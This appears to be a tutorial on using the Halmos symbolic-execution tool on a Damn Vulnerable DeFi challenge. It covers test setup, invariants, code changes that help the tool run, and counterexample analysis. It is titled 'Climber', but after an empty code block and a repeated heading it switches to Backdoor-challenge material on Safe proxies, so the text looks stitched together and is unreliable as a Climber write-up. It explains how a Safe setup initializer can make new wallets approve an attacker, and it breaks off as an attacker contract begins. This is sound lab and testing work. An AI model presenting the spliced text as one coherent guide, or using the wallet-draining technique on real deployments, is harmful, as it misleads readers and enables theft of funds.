# Halmos vs Climber
## Halmos version
halmos 0.2.4 was used in this article.
## Foreword
It is strongly assumed that the reader is familiar with the previous articles on solving 
1. [Unstoppable](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/unstoppable) 
2. [Truster](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/truster)
3. [Naive-receiver](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/naive-receiver)
4. [Side-entrance](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/side-entrance)
5. [The-rewarder](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/the-rewarder)
6. [Selfie](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/selfie)
7. [Backdoor](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/backdoor)

since the main ideas here are largely repeated and we will not dwell on them again.
## Preparation
### Common prerequisites
1. Copy **Climber.t.sol** file to **ClimberHalmos.t.sol**.
2. Rename `test_climber()` to `check_climber()`, so Halmos will execute this test symbolically.
3. Avoid using **makeAddr()** cheatcode:
    ```solidity
    address deployer = address(0xcafe0000);
    address player = address(0xcafe0001);
    address recovery = address(0xcafe0002);
    address proposer = address(0xcafe0003);
    address sweeper = address(0xcafe0004);
    ```
4. Create **GlobalStorage** contract and save address-name pairs of contracts:
    ```solidity
    ...
    import "lib/GlobalStorage.sol";
    ...
    GlobalStorage glob;
    ...
    function setUp() public {
        ...
        glob = new GlobalStorage();
        ...
        glob.add_addr_name_pair(address(vault), "ClimberVault");
        glob.add_addr_name_pair(address(timelock), "ClimberTimelock");
        glob.add_addr_name_pair(address(token), "DamnValuableToken");
        ...
    }
    ```
5. Print all contract addresses:
    ```solidity
    function check_climber() public checkSolvedByPlayer {
        SymbolicAttacker attacker = new SymbolicAttacker();
        console.log("GlobalStorage\t", address(glob));
        console.log("ClimberVault\t", address(vault));
        console.log("ClimberTimelock\t", address(timelock));
        console.log("token\t\t", address(token));
        console.log("GlobalStorage\t", address(attacker));
        ...
    }
    ```
    ```javascript
    $ halmos --solver-timeout-assertion 0 --function check_climber --loop 100
    ...
    [console.log] GlobalStorage      0x00000000000000000000000000000000000000000000000000000000aaaa0002
    [console.log] ClimberVault       0x00000000000000000000000000000000000000000000000000000000aaaa0004
    [console.log] ClimberTimelock    0x00000000000000000000000000000000000000000000000000000000aaaa0005
    [console.log] token              0x00000000000000000000000000000000000000000000000000000000aaaa0006
    [console.log] GlobalStorage      0x00000000000000000000000000000000000000000000000000000000aaaa0007
    ```
    Forewarning the question "And where is `0x000000000000000000000000000000000000000000000000000000000aaaa0003`"? This address is the current implementation of the vault contract:
    ```solidity
    function setUp() public {
        ...
        vault = ClimberVault(
            address(
                new ERC1967Proxy(
                    address(new ClimberVault()), // implementation (0xaaaa0003)
                    abi.encodeCall(ClimberVault.initialize, (deployer, proposer, sweeper)) // initialization data
                )
            )
        );
    ...
    ```
### _isSolved() implementation
The original checks look like:
```solidity
function _isSolved() private view {
    assertEq(token.balanceOf(address(vault)), 0, "Vault still has tokens");
    assertEq(token.balanceOf(recovery), VAULT_TOKEN_BALANCE, "Not enough tokens in recovery account");
}
```
We begin to come up with invariants that could help us achieve some unexpected behavior of target contracts:
1. The most obvious is checking whether we can somehow reduce the balance of the `vault`:
    ```solidity
    assert (token.balanceOf(address(vault)) >= VAULT_TOKEN_BALANCE);
    ```
2. A traditional `allowance` check is also here:
    ```solidity
    // Check allowance changes
    address symbolicSpender = svm.createAddress("symbolicSpender");
    assert (token.allowance(address(vault), symbolicSpender) == 0);
    ```
3. We are checking if we can somehow manipulate `_sweeper` and `owner` of vault:
    ```solidity
    // Check vault roles immutability:
    assert(vault.getSweeper() == sweeper);
    assert(vault.owner() == address(timelock));
    ```
4. Since the `vault` from the setup is essentially a **UUPS** proxy contract, we can check whether the very **implementation** of this proxy cannot be manipulated in any way. In **ERC1967Utils.sol** we can find the following function:
    ```solidity
    bytes32 internal constant IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    ...
    function getImplementation() internal view returns (address) {
        return StorageSlot.getAddressSlot(IMPLEMENTATION_SLOT).value;
    }
    ```
    Let's use `vm.load()` cheatcode to achieve this:
    ```solidity
    // Check vault implementation immutability
    bytes32 slot = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    bytes32 result = vm.load(address(vault), slot);
    address currentImpl = address(uint160(uint256(result)));
    assert(currentImpl == address(0xaaaa0003));
    ```
5. Checking if we can give someone a new role in **ClimberTimelock**:
    ```solidity
    // Check timelock roles immutability
    address symbolicProposer = svm.createAddress("symbolicProposer");
    vm.assume(symbolicProposer != proposer);
    assert(!timelock.hasRole(PROPOSER_ROLE, symbolicProposer));

    address symbolicAdmin = svm.createAddress("symbolicAdmin");
    vm.assume(symbolicAdmin != deployer);
    vm.assume(symbolicAdmin != address(timelock));
    assert(!timelock.hasRole(ADMIN_ROLE, symbolicAdmin));
    ```
## Improvement of coverage
### SymbolicAttacker callback handling
Up to this point, we have not considered scenarios where some target contract makes a symbolic `call` back to **SymbolicAttacker** by default. But on the example of the [side-entrance](https://github.com/igorganich/damn-vulnerable-defi-halmos/blob/master/test/side-entrance/README.md#callbacks), [Selfie](https://github.com/igorganich/damn-vulnerable-defi-halmos/blob/master/test/selfie/README.md#onflashloan) and [backdoor](https://github.com/igorganich/damn-vulnerable-defi-halmos/blob/master/test/backdoor/README.md#delegatecall) challenges, we can say that this is a fairly common scenario when control is passed back to the contract controlled by the attacker.

Therefore, we will now add a special `fallback()` to **SymbolicAttacker**, which will be able to handle calls from other contracts:
```solidity
fallback() external payable {
    bytes4 selector = svm.createBytes4("fallback_selector");
    vm.assume(selector == bytes4(msg.data));
    execute_tx("fallback_target");
    bytes memory retdata = svm.createBytes(1000, "fallback_retdata");// something should be returned
    assembly {
        return(add(returndata, 0x20), mload(returndata));
    }
}
```
Now let's add functionality to **GlobalStorage** to allow other contracts to call this `fallback()`:

```javascript










```
## Improvement of coverage
### delegatecall
For the first time, we meet with the target-call pattern, but at the same time we do not make `call` but `delegatecall`:
```javascript
Path #22:
...
            CALL Safe::simulateAndRevert(Concat(p_targetContract_address_76fe5e4_49(), 0x0000000000000000000000000000000000000000000000000000000000000040, p_calldataPayload_length_ea68c34_51(), p_calldataPayload_bytes_7c96bce_50()))
                DELEGATECALL Safe::Extract(p_calldataPayload_bytes_7c96bce_50())(Extract(p_calldataPayload_bytes_7c96bce_50()))
                ↩ CALLDATALOAD 0x (error: NotConcreteError('symbolic CALLDATALOAD offset: 4 + Extract(7903, 7648, p_calldataPayload_bytes_7c96bce_50)'))
...
```
```solidity
/**
 * @dev Performs a delegatecall on a targetContract in the context of self.
 * Internally reverts execution to avoid side effects (making it static).
 *
 * This method reverts with data equal to `abi.encode(bool(success), bytes(response))`.
 * Specifically, the `returndata` after a call to this method will be:
 * `success:bool || response.length:uint256 || response:bytes`.
 *
 * @param targetContract Address of the contract containing the code to execute.
 * @param calldataPayload Calldata that should be sent to the target contract (encoded method name and arguments).
 */
function simulateAndRevert(address targetContract, bytes memory calldataPayload) external {
    // solhint-disable-next-line no-inline-assembly
    assembly {
        let success := delegatecall(gas(), targetContract, add(calldataPayload, 0x20), mload(calldataPayload), 0, 0)

        mstore(0x00, success)
        mstore(0x20, returndatasize())
        returndatacopy(0x40, 0, returndatasize())
        revert(0, add(returndatasize(), 0x40))
    }
}
```
We will handle the `delegatecall` of a symbolic target quite simply: цe will specify our **SymbolicAttacker** as the only target, and the only function should be some `handle_delegatecall()` callback, in which we will symbolically iterate through the functions using the familiar method:
```solidity
function handle_delegatecall() public {
    execute_tx("handle_delegatecall_target");
}
```
```solidity
...
function simulateAndRevert(address targetContract, bytes memory calldataPayload) external {
    vm.assume(targetContract == address(0xaaaa0007));
    vm.assume(bytes4(calldataPayload) == bytes4(keccak256("handle_delegatecall()")));
    ...
}
```
There are several more such places with `delegatecall` crash:
```javascript
Path #185:
...
            CALL SafeProxyFactory::createProxyWithNonce(...)
            ...
                CALL SafeProxy::Extract(p_initializer_bytes_56179b1_14())(Extract(p_initializer_bytes_56179b1_14()))
                    DELEGATECALL SafeProxy::Extract(p_initializer_bytes_56179b1_14())(Extract(p_initializer_bytes_56179b1_14()))
                    ↩ CALLDATALOAD 0x ((error: NotConcreteError('symbolic CALLDATALOAD offset: 4 + Extract(7903, 7648, p_initializer_bytes_56179b1_14)'))
```
```solidity
function deployProxy(...) {
    ...
    if (initializer.length > 0) {
        // solhint-disable-next-line no-inline-assembly
        assembly {
            if eq(call(gas(), proxy, 0, add(initializer, 0x20), mload(initializer), 0, 0), 0) {
                revert(0, 0)
            }
        }
    }
}
```
I know, it is not clear what happened from these logs. But it is enough to look at the implementation of **SafeProxy** and everything will become clear:
```solidity
contract SafeProxy {
    // Singleton always needs to be first declared variable, to ensure that it is at the same location in the contracts to which calls are delegated.
    // To reduce deployment costs this variable is internal and needs to be retrieved via `getStorageAt`
    address internal singleton;

    /**
     * @notice Constructor function sets address of singleton contract.
     * @param _singleton Singleton address.
     */
    constructor(address _singleton) {
        require(_singleton != address(0), "Invalid singleton address provided");
        singleton = _singleton;
    }

    /// @dev Fallback function forwards all transactions and returns all received return data.
    fallback() external payable {
        // solhint-disable-next-line no-inline-assembly
        assembly {
            let _singleton := and(sload(0), 0xffffffffffffffffffffffffffffffffffffffff)
            // 0xa619486e == keccak("masterCopy()"). The value is right padded to 32-bytes with 0s
            if eq(calldataload(0), 0xa619486e00000000000000000000000000000000000000000000000000000000) {
                mstore(0, _singleton)
                return(0, 0x20)
            }
            calldatacopy(0, 0, calldatasize())
            let success := delegatecall(gas(), _singleton, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            if eq(success, 0) {
                revert(0, returndatasize())
            }
            return(0, returndatasize())
        }
    }
}
```
Halmos automatically performs `fallback()` (which is the only function of this contract). And inside it is this `delegatecall`. Before fixing this error, let's talk about how this feature works in general at the moment in the context of Halmos. 

This contract is written in such a way that it is convenient to use any function from **Safe** while calling **safeProxy**.  And since Halmos handles the case when the function we're trying to reach from the `proxy` doesn't exist in the `singleton`, it can call a `fallback` again. So we have to add protection against recursion.

Next, since the `singleton` address is transmitted in a symbolic manner when creating a `proxy`, we work with some symbolic `singleton`.

We need to fix the "symbolic offset" error that occurs when using the target-call pattern, while not damaging the main logic of this `proxy`. It's hard to think of anything better than just adding another `symbolic_fallback` function that will handle this specific case that throws this error:
```solidity
contract SafeProxy is Test, SymTest{
    address internal singleton;

    bool reent_guard = false;
    GlobalStorage glob = GlobalStorage(address(0xaaaa0002));
    ...
    function symbolic_fallback() external payable {
        if (reent_guard) {
            revert();
        }
        reent_guard = true;
        address singleton_address;
        bytes memory initializer_data;
        (singleton_address, initializer_data) = glob.get_concrete_from_symbolic_optimized(singleton);
        (bool success,bytes memory returndata) = singleton_address.delegatecall(initializer_data);
        reent_guard = false;
        if (!success) {
            // Revert with the returned data
            assembly {
                revert(add(returndata, 0x20), mload(returndata))
            }
        }
    
        // Return with the returned data
        assembly {
            return(add(returndata, 0x20), mload(returndata))
        }
    }
    
    fallback() external payable {
        // Check for mastercopy() call
        if (msg.sig == bytes4(keccak256("mastercopy()"))) {
            assembly {
                mstore(0x00, sload(singleton.slot))
                return(0x00, 32)
            }
        } else {
            _delegateCall();
        }
    }
    
    function _delegateCall() internal {
        (bool success, bytes memory returndata) = singleton.delegatecall(msg.data);
        if (!success) {
            // Revert with the returned data
            assembly {
                revert(add(returndata, 0x20), mload(returndata))
            }
        }

        // Return with the returned data
        assembly {
            return(add(returndata, 0x20), mload(returndata))
        }
    }
}
```
```solidity
function deployProxy(...) {
    ...
    if (initializer.length > 0) {
        // solhint-disable-next-line no-inline-assembly
        /*assembly {
            if eq(call(gas(), proxy, 0, add(initializer, 0x20), mload(initializer), 0, 0), 0) {
                revert(0, 0)
            }
        }*/
        proxy.symbolic_fallback();
    }
}
```

And one more place with `delegatecall`:
```solidity
abstract contract Executor {
...
    function execute(
        address to,
        uint256 value,
        bytes memory data,
        Enum.Operation operation,
        uint256 txGas
    ) internal returns (bool success) {
        if (operation == Enum.Operation.DelegateCall) {
            // solhint-disable-next-line no-inline-assembly
            assembly {
                success := delegatecall(txGas, to, add(data, 0x20), mload(data), 0, 0)
            }
        } else {
            // solhint-disable-next-line no-inline-assembly
            assembly {
                success := call(txGas, to, value, add(data, 0x20), mload(data), 0, 0)
            }
        }
    }
...
}
```
Even though this place doesn't throw a **revert**, it's still better to use `delegatecall_handler` than iterating through Halmos automatically to make it more generic.
```solidity
if (operation == Enum.Operation.DelegateCall) {
    // solhint-disable-next-line no-inline-assembly
    vm.assume(to == address(0xaaaa0007));
    vm.assume(bytes4(data) == bytes4(keccak256("handle_delegatecall()")));
    ...
```
### Regular symbolic memory offset
There is also the usual `call` by symbolic calldata:
```solidity
function execute(
        address to,
        uint256 value,
        bytes memory data,
        Enum.Operation operation,
        uint256 txGas
    ) internal returns (bool success) {
...
   else {
        // solhint-disable-next-line no-inline-assembly
        assembly {
            success := call(txGas, to, value, add(data, 0x20), mload(data), 0, 0)
        }
    }
}
```
We deal with it as usual:
```solidity
...
} else {
   address target = svm.createAddress("execute_target");
    bytes memory mydata;
    //Get some concrete target-name pair
    (target, mydata) = glob.get_concrete_from_symbolic_optimized(target);
    target.call(mydata);
    
    /*assembly {
        success := call(txGas, to, value, add(data, 0x20), mload(data), 0, 0)
    }*/
}
...
```
Another place with symbolic offset is signature checks in `Safe::execTransaction`:
```solidity
function execTransaction(
...
bytes calldata data,
...
bytes memory signatures
) public payable virtual returns (bool success) {
...
 bytes32 txHash;
// Use scope here to limit variable lifetime and prevent `stack too deep` errors
{
    bytes memory txHashData = encodeTransactionData(
        // Transaction info
        to,
        value,
        data,
        operation,
        safeTxGas,
        // Payment info
        baseGas,
        gasPrice,
        gasToken,
        refundReceiver,
        // Signature info
        nonce
    );
    // Increase nonce and execute transaction.
    nonce++;
    txHash = keccak256(txHashData);
    checkSignatures(txHash, txHashData, signatures);
...
}
```
Let's handle this as we do with other cryptographic checks: we simply remove this logic, assuming that the data was entered correctly.
### OwnerIsNotABeneficiary issue
Let's try running the test now:
```javascript
$ halmos --solver-timeout-assertion 0 --function check_backdoor --loop 100
...
CALL SafeProxyFactory::createProxyWithCallback(...)
...
    CALL SafeProxy::symbolic_fallback(...)
    ...
        DELEGATECALL SafeProxy::setup(...)
    ...
    CALL  0xaaaa0006::proxyCreated(...)
    ...
        REVERT OwnerIsNotABeneficiary ((error: Revert())
    ...
```
This revert is worth our attention, because at the moment all the code of this function that follows this revert is blocked. This revert happens 100% of the time if it reaches this point.

This revert happens after we made a valid `call` to `createProxyWithCallback`. `setup` was executed, but for some reason Halmos cannot understand that the `owner` we passed in the setup process can be some valid `owner`:
```solidity
function createProxyWithCallback(...) {
    uint256 saltNonceWithCallback = uint256(keccak256(abi.encodePacked(saltNonce, callback)));
    proxy = createProxyWithNonce(_singleton, initializer, saltNonceWithCallback);
    if (address(callback) != address(0)) callback.proxyCreated(proxy, _singleton, initializer, saltNonce);
}
```
```solidity
function setup(
    address[] calldata _owners,
    uint256 _threshold,
...
) {
    setupOwners(_owners, _threshold);// owners setup is happening here
    ...
}
```
```solidity
function proxyCreated(SafeProxy proxy, address singleton, bytes calldata initializer, uint256) external override {
    ...
    if (owners.length != EXPECTED_OWNERS_COUNT) { // 1 is expected count
        revert InvalidOwnersCount(owners.length);
    }

    // Ensure the owner is a registered beneficiary
    address walletOwner;
    unchecked {
        walletOwner = owners[0];
    }
    if (!beneficiaries[walletOwner]) {
        revert OwnerIsNotABeneficiary();
    }
    ...
```
At least, it sees a scenario where there is only one `owner`. Let's print this `owner`, see why Halmos doesn't see that owner can be valid:
```solidity
...
console.log("walletOwner is");
console.log(walletOwner);
if (!beneficiaries[walletOwner]) {
    revert OwnerIsNotABeneficiary();
}
```
```javascript
$ halmos --solver-timeout-assertion 0 --function check_backdoor --loop 100
...
[console.log] walletOwner is
[console.log] 0x0000000000000000000000000000000000000000000000000000000000000000
...
```
What? `0x0`? Why not symbolic? To answer this question, you need to understand how this algorithm stores and then reads the list of `owners`:
```solidity
...
address internal constant SENTINEL_OWNERS = address(0x1);
mapping(address => address) internal owners;
    ...
function setupOwners(address[] memory _owners, uint256 _threshold) internal {
    // Threshold can only be 0 at initialization.
    // Check ensures that setup function can only be called once.
    require(threshold == 0, "GS200");
    // Validate that threshold is smaller than number of added owners.
    require(_threshold <= _owners.length, "GS201");
    // There has to be at least one Safe owner.
    require(_threshold >= 1, "GS202");
    // Initializing Safe owners.
    address currentOwner = SENTINEL_OWNERS;
    for (uint256 i = 0; i < _owners.length; i++) {
        // Owner address cannot be null.
        address owner = _owners[i];
        require(owner != address(0) && owner != SENTINEL_OWNERS && owner != address(this) && currentOwner != owner, "GS203");
        // No duplicate owners allowed.
        require(owners[owner] == address(0), "GS204");
        owners[currentOwner] = owner;
        currentOwner = owner;
    }
    owners[currentOwner] = SENTINEL_OWNERS;
    ownerCount = _owners.length;
    threshold = _threshold;
}
...
function getOwners() public view returns (address[] memory) {
    address[] memory array = new address[](ownerCount);

    // populate return array
    uint256 index = 0;
    address currentOwner = owners[SENTINEL_OWNERS];
    while (currentOwner != SENTINEL_OWNERS) {
        array[index] = currentOwner;
        currentOwner = owners[currentOwner];
        index++;
    }
    return array;
}
```
Some clever algorithm is used, which allows you to store owners' addresses in the mapping, and then craft an array based on it. The problem is that Halmos does not handle cases when the mapping index is some symbolic value:
```solidity
owners[currentOwner] = owner;
...
owners[currentOwner] = SENTINEL_OWNERS;
```
It is, in fact, difficult to catch such Halmos behavior or even understand that something is wrong. 

Okay, let's fix it somehow. For this particular case, I propose to abandon this algorithm through mapping, and use a regular array, assuming that there are no more than 2 owners (the largest size of a dynamic array considered by Halmos by default):
```solidity
...
mapping(address => address) internal owners;
address[2] array_owners;
...
function setupOwners(address[] memory _owners, uint256 _threshold) internal {
    ...
    for (uint256 i = 0; i < _owners.length; i++) {
        ...
        array_owners[i] = _owners[i];
    }
    ...
}
...
function getOwners() public view returns (address[] memory) {
    address[] memory array = new address[](ownerCount);
    for (uint256 i = 0; i < ownerCount; i++)  {
        array[i] = array_owners[i];
    }
    return array;
}
```
Run:
```javascript
$ halmos --solver-timeout-assertion 0 --function check_backdoor --loop 100
...
[console.log] walletOwner is
[console.log] Concat(0x000000000000000000000000, Extract(p__owners[0]_address_c7821fc_58()))
...
```
So much better!
### solver-timeout-branching halmos option
Now let's move on to an important `--solver-timeout-branching` parameter of Halmos. If you examine several different logs with full traces of all paths that were made in different runs, you can see that they differ a lot. Halmos starts to run erratically, especially if the working machine is overloaded: entire functions have been ignored. This is a clear sign that the solver does not cope with branching. Simply put: every time Halmos encounters a branching statement (for example **if**), it runs a solver that determines whether the statement is **true** or **false**. And, unfortunately, sometimes the solver cannot calculate it quickly (especially in such complex setups with an overloaded number of symbolic variables). Because of this, it does not fit into the timeout allocated to it, and branching does not occur in a correct way. 

The solution is actually quite simple, but expensive. We simply add another startup parameter:
```javascript
--solver-timeout-branching 0
```
This completely removes the timeout for the branching solver.

However, on the other hand, the speed of operations has significantly decreased. From `~29000` operations per second, the speed dropped to `~8000` on my machine.
## create2 during test
In this challenge, we have a unique feature: the logic of the test is based on the fact that new contracts will be created during the test.
```soliidty
function deployProxy(address _singleton, bytes memory initializer, bytes32 salt) internal returns (SafeProxy proxy) {
...
assembly {
    proxy := create2(0x0, add(0x20, deploymentData), mload(deploymentData), salt)
}
require(address(proxy) != address(0), "Create2 call failed");
...
```
Note that Halmos completely ignores the logic with `salt` when working with `create2` and creates new contracts with addresses `0xbbbb****`. This is, in fact, convenient for us, because it turns out not a symbolic address, but a specific one.

And of course, we do not forget that if some contract was created, it should be added to **GlobalStorage**. But it would be naive to just add the address of the new contract and its name **SafeProxy**:
```solidity
glob.add_addr_name_pair(address(proxy), "SafeProxy");
```
Why? Because **SafeProxy** doesn't implement any function (Let's don't take into account our `symbolic_fallback()`). Instead, any function implemented in its `singleton` can be called via **SafeProxy**. Therefore, it will be logical to add just such a pair: the address of **SafeProxy**, but the name of the contract from which calldata will be generated - as in `singleton`:

```solidity
contract GlobalStorage is Test, SymTest {
...
/*
    ** The logic of this function is similar to the logic of get_concrete_from_symbolic, 
    ** with the difference that this time the name of the contract is returned 
    ** instead of the ready calldata
    */
    function get_contract_name_by_address (address /*symbolic*/ addr ) public
                                        returns (string memory name)
    {
        for (uint256 i = 0; i < addresses_list_size; i++) {
            if (addresses[i] == addr) {
                name = names_by_addr[addresses[i]];
                return name;
            }
        }
        vm.assume(false);// Ignore cases when addr is not some concrete known address
    }
...
```
```solidity
function deployProxy(address _singleton, bytes memory initializer, bytes32 salt) internal returns (SafeProxy proxy) {
    ...
    string memory singleton_name = glob.get_contract_name_by_address(_singleton);
    glob.add_addr_name_pair(address(proxy), singleton_name);
    ...
}
```

## Optimizations and heuristics
### Beating recursion issue
```javascript
halmos --solver-timeout-assertion 0 --function check_backdoor --loop 100 -vvvvv
...
Path #9642:
...
    CALL 0xaaaa0003::simulateAndRevert(...)
    ...
        CALL 0xaaaa0004::createProxyWithNonce(...)
    ...
            CALL 0xbbbb0016::0x7bb34722()
    ...
                DELEGATECALL 0xbbbb0016::setup
    ...
                    DELEGATECALL 0xbbbb0016::handle_delegatecall()
    ...
                        CALL 0xaaaa0004::createProxyWithCallback(...)
    ...
                            CALL 0xbbbb0022::0x7bb34722()
    ...                        
...
ERROR    ArgumentError: argument 1: RecursionError: maximum recursion depth exceeded 
```
Due to the high complexity of the setup, we have several ways to access the `SafeProxyFactory::deployProxy` function. In addition, creating a contract through this function can call `deployProxy` again, but from a different entry point:
```solidity
function createProxyWithNonce(...) public {
    ...
    proxy = deployProxy(_singleton, initializer, salt);
    ...
}
...
function createChainSpecificProxyWithNonce(...) public {
   ...
   proxy = deployProxy(_singleton, initializer, salt);
   ...
}
...
function createProxyWithCallback(...) public {
    ...
    proxy = createProxyWithNonce(_singleton, initializer, saltNonceWithCallback);
    ...
}
...
```
Therefore, the usual way of avoiding recursion by using `get_concrete_from_symbolic_optimized` is not suitable for us. Since `createProxyWithNonce` is called inside `createProxyWithCallback`, we can use the same approach as in [naive-receiver](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/selfie/test/naive-receiver#proxy-heuristics) and simply cut scenarios with a direct symbolic call to `createProxyWithNonce` without sacrificing overall code coverage. We will do this by implementing a new functionality to exclude entire functions from coverage in **GlobalStorage**. This also will help us to conveniently exclude `permit` and similar functions:
```solidity
contract GlobalStorage is Test, SymTest {
    constructor() {
        add_banned_function_selector(bytes4(keccak256("permit(address,address,uint256,uint256,uint8,bytes32,bytes32)")));
        add_banned_function_selector(bytes4(keccak256("delegateBySig(address,uint256,uint256,uint8,bytes32,bytes32)")));
    }
    ...
    mapping (uint256 => bytes4) banned_selectors;
    uint256 banned_selectors_size = 0;

    function add_banned_function_selector(bytes4 selector) public {
        banned_selectors[banned_selectors_size] = selector;
        banned_selectors_size++;
    }
    ...
    function get_concrete_from_symbolic_optimized (address /*symbolic*/ addr) public 
                                        returns (address ret, bytes memory data) 
    {
    ...
        vm.assume(selector == bytes4(data));
        for (uint256 s = 0; s < banned_selectors_size; s++) {
            vm.assume(selector != banned_selectors[s]);
        }
        ...
    }
```
```solidity
function setUp() public {
    ...
    glob.add_banned_function_selector(bytes4(keccak256("createProxyWithNonce(address,bytes,uint256)")));
    glob.add_banned_function_selector(bytes4(keccak256("createChainSpecificProxyWithNonce(address,bytes,uint256)")));
    vm.stopPrank();
}
```
The `createChainSpecificProxyWithNonce` function was also banned as its only difference from `createProxyWithNonce` is the generated salt. And since Halmos completely ignores salt when creating contracts via `create2` - there is no point in checking this function separately.
### simulateAndRevert function
Let's look on this function from **safe-smart-account**:
```solidity
function simulateAndRevert(address targetContract, bytes memory calldataPayload) external {
    // solhint-disable-next-line no-inline-assembly
    assembly {
        let success := delegatecall(gas(), targetContract, add(calldataPayload, 0x20), mload(calldataPayload), 0, 0)

        mstore(0x00, success)
        mstore(0x20, returndatasize())
        returndatacopy(0x40, 0, returndatasize())
        revert(0, add(returndatasize(), 0x40))
    }
}
```
It is built in such a way that it is guaranteed to avoid side effects. Since it can produce a whole tree of symbolic calls that are guaranteed to lead to nothing, we will simply disable it for optimization:
```solidity
glob.add_banned_function_selector(bytes4(keccak256("simulateAndRevert(address,bytes)")));
```
### State snapshots
Until now, when using symbolic calls, we never checked whether it ended with a **revert** or whether the transaction was successful. In fact, this only inflates the number of possible paths, since even if the transaction fails, we continue to check the path. And, as practice shows, we can only be interested in transactions that somehow changed the state of the contracts. Now we will use a cool new approach via **state snapshots**, which became possible after the Halmos 0.2.3 update.

Its essence is simple: before any symbolic `call`, we generate a `uint` dump of the current state of the system. After that `call` - read dump again and compare with the previous one. If the state did not change, it was guaranteed to be an "empty" transaction and there is no point in continuing to execute this path. 

One example of such an approach:
```solidity
function execute_tx(string memory target_name) private {
    ...
    uint snap0 = vm.snapshotState();
    target.call(data);
    uint snap1 = vm.snapshotState();
    vm.assume(snap0 != snap1);
}
```
To understand how strong this improvement is, it is enough to say that experiments with [Truster](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/truster) showed x5 speedup in finding solution.

## Counterexample analysis
Finally, after all these preparations, we can finally get the counterexample:
```javascrript
halmos --solver-timeout-assertion 0 --solver-timeout-branching 0 --function check_backdoor --loop 100
...
WARNING  Counterexample (potentially invalid):
             halmos_attack_target_address_d611c7d_01 = 0x00000000000000000000000000000000aaaa0003
             halmos_handle_delegatecall_target_address_3d06944_127 = 0x00000000000000000000000000000000aaaa0005  
             halmos_handle_delegatecall_target_address_c8e86a1_56 = 0x00000000000000000000000000000000aaaa0004
             halmos_selector_bytes4_107807b_143 = approve
             halmos_selector_bytes4_531278b_55 = execTransaction
             halmos_selector_bytes4_2b46211_126 = setup
             halmos_selector_bytes4_ce3956b_72 = createProxyWithCallback
             halmos_symbolic_spender_address_4a8d582_144 = 0x0020040000000000000000000000000400000000
             p__owners[0]_address_fad3a48_110 = 0x00000000000000000000000000000000000000000000000000000000cafe0003
             p__owners_length_10bdd7d_109 = 0x0000000000000000000000000000000000000000000000000000000000000001
             p__singleton_address_6e025f6_63 = 0x00000000000000000000000000000000000000000000000000000000aaaa0003
             p__threshold_uint256_02c5463_112 = 0x0000000000000000000000000000000000000000000000000000000000000001
             p_amount_uint256_f09a3f6_130 = 0x0000000000000000000000000000000000000000000000000000000000000001
             p_baseGas_uint256_b1e9294_17 = 0x0000000000000000000000000000000000000000000000000000000000000000
             p_callback_address_3b906f4_67 = 0x00000000000000000000000000000000000000000000000000000000aaaa0006
             p_data_bytes_4cafaa8_13 = 0x00...00                                                                                                          
             p_data_length_df2cef7_14 = 0x0000000000000000000000000000000000000000000000000000000000000400
             p_data_length_f72314b_115 = 0x0000000000000000000000000000000000000000000000000000000000000400
             p_fallbackHandler_address_9d46cfe_116 = 0x0000000000000000000000000000000000000000000000000000000000000000
             p_gasPrice_uint256_1b8c476_18 = 0x0000000000000000200000000000000000000000000000000000000000000000
             p_gasToken_address_124a4c5_19 = 0x00000000000000000000000000000000000000000000000000000000aaaa0005
             p_initializer_bytes_35bf1c5_64 =0xb63e800d00000000000...00
             p_initializer_length_27402fc_65 = 0x0000000000000000000000000000000000000000000000000000000000000400
             p_operation_uint8_7c66862_15 = 0x0000000000000000000000000000000000000000000000000000000000000001
             p_paymentReceiver_address_95e4d39_119 = 0x00000000000000000000000000000000000000000000000000000000bbbb0020
             p_paymentToken_address_79464f1_117 = 0x0000000000000000000000000000000000000000000000000000000000000000
             p_payment_uint256_985362d_118 = 0x7ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffc
             p_refundReceiver_address_dd44e1b_20 = 0x0000000000000000000000000000000000000000000000000000000000000001
             p_safeTxGas_uint256_f825f64_16 = 0x0000000000000000000000000000000000000000000000000000000000000001
             p_saltNonce_uint256_eeb7667_66 = 0x0000000000000000000000000000000000000000000000000000000000000000
             p_signatures_length_2d407bc_22 = 0x0000000000000000000000000000000000000000000000000000000000000400
             p_spender_address_93cdbf9_129 = 0x0000000000000000000000000020040000000000000000000000000400000000
             p_to_address_7a0345f_113 = 0x00000000000000000000000000000000000000000000000000000000aaaa0007
             p_to_address_b19e0c9_11 = 0x00000000000000000000000000000000000000000000000000000000aaaa0007
             p_value_uint256_41861fd_12 = 0x0000000000000000000000000000000000000000000000000000000000000000
             ...
```
This counterexample contains a lot of "trash" information, but you can extract the essence of the bug from it. Anyone can create a **Safe** wallet for **Alice**. But at the same time, during creation, an attacker can call absolutely any code on behalf of **Alice's** **SafeProxy**, using `setup()` and passing the appropriate code as an `initializer`. So Halmos forced **SafeProxy** to execute `approve` for some `symbolic_spender`, thereby breaking the invariant for the absence of `allowance`. 
This, in fact, is enough for the attack scenario to become obvious: when creating **Safe** wallets for **Alice**, **Bob**, **Charlie** and **David**, we make an `approve` for a contract that we control and withdraw funds from the newly created wallet.

Note that using the **Safe** contract as a proxy for this attack is optional. It's just that Halmos found such a way.
## Creating an attack
Attacker:
```solidity
// SPDX-License-Identifier: MIT

pragma solidity =0.8.25;

import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
import {SafeProxy} from "safe-smart-account/contracts/proxies/SafeProxy.sol";
import "../../src/backdoor/WalletRegistry.sol";
import {Safe} from "@safe-global/safe-smart-account/contracts/Safe.sol";

contract Attacker {
    DamnValuableToken token;
    SafeProxyFactory factory;
    WalletRegistry registry;
    address singleton;
    address recovery;

    constructor(DamnValuableToken _token, 
